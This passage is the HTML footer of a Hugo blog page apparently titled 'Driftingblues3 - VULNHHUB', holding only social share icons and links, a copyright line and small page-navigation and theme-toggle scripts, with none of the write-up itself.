d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Driftingblues3 - VULNHHUB on whatsapp" href="https://api.whatsapp.com/send?text=Driftingblues3%20-%20VULNHHUB%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2fheheh%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Driftingblues3 - VULNHHUB on telegram" href="https://telegram.me/share/url?text=Driftingblues3%20-%20VULNHHUB&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fheheh%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Driftingblues3 - VULNHHUB on ycombinator" href="https://news.ycombinator.com/submitlink?t=Driftingblues3%20-%20VULNHHUB&u=http%3a%2f%2flocalhost%3a1313%2fposts%2fheheh%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=http://localhost:1313/>xf0lt</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>